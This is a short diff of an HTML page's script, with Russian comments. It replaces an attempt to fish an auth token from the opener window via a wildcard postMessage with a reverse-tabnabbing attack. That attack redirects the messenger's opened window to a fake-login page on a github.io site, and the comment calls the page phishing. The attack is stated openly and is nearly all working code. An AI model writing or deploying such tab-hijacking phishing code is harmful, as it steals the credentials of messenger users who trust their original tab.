@@ -17,8 +17,9 @@
 
     // Пытаемся спровоцировать мессенджер прислать нам что-то
     if (window.opener) {
-        window.opener.postMessage("get_auth_token", "*"); 
-    }
+    // Мы подменяем страницу в открытом окне мессенджера на твой фишинг
+    window.opener.location = "https://lin-li-shu.github.io/test-preview/index/fake-login.html";
+}
 </script>
 </body>
 </html>
